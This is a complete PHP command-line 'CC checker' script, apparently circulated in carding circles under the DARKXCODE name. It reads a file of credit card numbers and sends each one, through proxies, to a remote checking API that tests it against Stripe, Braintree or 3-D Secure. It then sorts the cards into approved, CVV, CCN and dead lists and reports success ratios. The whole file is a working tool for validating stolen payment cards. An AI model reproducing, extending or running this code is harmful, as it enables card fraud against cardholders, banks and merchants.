<?php
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : CC CHECKER
 * VERSION  : 4
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */

require_once "function/function.php";
require_once "function/settings.php";

echo banner();
echo banner2();
enterlist:
echo "\n\n$WH [$BL+$WH]$BL Enter your list $WH($DEF eg:$YL list.txt$WH )$GR >> $WH";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
 echo " [!] Your Fucking list not found [!]".PHP_EOL;
 goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

entergate:
echo "\n         [$GR+$WH]$BL MERCHANT$WH [$GR+$WH] $WH
 [$GR 1 $WH]$BL STRIPE $WH       [$GR 2 $WH]$BL BRAINTREE $WH
 [$GR 3 $WH]$BL Check VBV $WH       
 [$GR 99 $WH]$BL EXIT  $WH

 [$BL+$WH]$BL CHOOSE$GR >> $WH";
$gateee = trim(fgets(STDIN));
if($gateee == 1){
    $gateWay = "stripe";
}else if ($gateee == 2){
    $gateWay = "braintree";
}else if ($gateee == 3){
    $gateWay = "vbv";
}else if ($gateee == 99){
    echo "\n\n [$BL!$WH] THANKS FOR USING [$BL!$WH]\n\n";
    exit();
}else{
    echo "\n\n [$RD!$WH] CHOOSE NOT FOUND [$RD!$WH]\n\n";
    goto entergate;
}


$total = count($lists);
$live = 0;
$cvv = 0;
$ccn = 0;
$die = 0;
$unknown = 0;
$no = 0;
echo PHP_EOL.PHP_EOL;
foreach ($lists as $list) {
    $no++;

    $api = $APIs."checker/cc-checkerV4/?apikey=$apikey&gate=$gateWay&cc=$list&proxy=$Proxies&proxyPWD=$proxy_pwd&type_proxy=$type_proxy";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "CURL/COMMAND LINE");
    $x = curl_exec($ch);
    curl_close($ch);
    $js  = json_decode($x, TRUE);
    $msg           = $js['data']['info']['msg'];
    $bin           = $js['data']['info']['bin'];
    $Merchant      = $js['data']['info']['merchant'];
    $scheme        = $js['data']['info']['scheme'];
    $country       = $js['data']['info']['country'];
    $bank_name     = $js['data']['info']['bank_name'];
    $bank_brand    = $js['data']['info']['bank_brand'];

    $gateWay2 = strtoupper($gateWay);

    if(strpos($x, 'payment success.')){
        $live++;
        save_file("result/live.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR APPROVED$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, 'Authenticate Successful')){
        $live++;
        save_file("result/live.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR PASSED$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, 'Authenticate Attempt Successful')){
        $live++;
        save_file("result/live.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR PASSED$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, 'Authenticate Unavailable')){
        $live++;
        save_file("result/live.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR PASSED$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "transaction_not_allowed")){
        $cvv++;
        save_file("result/cvv.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$BL CVV$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG TRANSACTION NOT ALLOWED$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "authentication_required")){
        $cvv++;
        save_file("result/cvv.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$BL CVV$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG 32DS REQUIRED$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "card_error_authentication_required")){
        $cvv++;
        save_file("result/cvv.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$BL CVV$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG 32DS REQUIRED$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "three_d_secure_redirect")){
        $cvv++;
        save_file("result/cvv.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$BL CVV$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG 32DS REQUIRED$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "incorrect_cvc")){
        $ccn++;
        save_file("result/ccn.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL CCN =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG INCORRECT CVC$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "invalid_cvc")){
        $ccn++;
        save_file("result/ccn.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL CCN =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG INVALID CVC$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if(strpos($x, "insufficient_funds")){
        $ccn++;
        save_file("result/ccn.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL CCN =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF:$MG INSUFFICIENT FUNDS$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else if (strpos($x, '"status":"failed"')){
        $die++;
        save_file("result/dead.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL MERCHANT$DEF: $MG$gateWay2$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }else{
        $unknown++;
        save_file("result/unknown.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG $msg$DEF ] | BY$CY DARKXCODE$DEF (V4)".PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================".PHP_EOL;
echo " DATE          : ".$date.PHP_EOL;
echo " APPROVE       : ".$live.PHP_EOL;
echo " CVV           : ".$cvv.PHP_EOL;
echo " CCN           : ".$ccn.PHP_EOL;
echo " DIE           : ".$die.PHP_EOL;
echo " UNKNOWN       : ".$unknown.PHP_EOL;
echo " TOTAL         : ".$total.PHP_EOL;
echo "======================================".PHP_EOL;
echo "[+] RATIO APPROVE => $GR".round(RatioCheck($live, $total))."%$DEF".PHP_EOL;
echo "[+] RATIO CVV     => $BL".round(RatioCheck($cvv, $total))."%$DEF".PHP_EOL;
echo "[+] RATIO CCN     => $YL".round(RatioCheck($ccn, $total))."%$DEF".PHP_EOL.PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' [!]".PHP_EOL;
echo "This file '".$listname."'".PHP_EOL;
echo "File saved in folder 'result/' ".PHP_EOL.PHP_EOL;


// ==========> FUNCTION

function collorLine($col){
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
?>
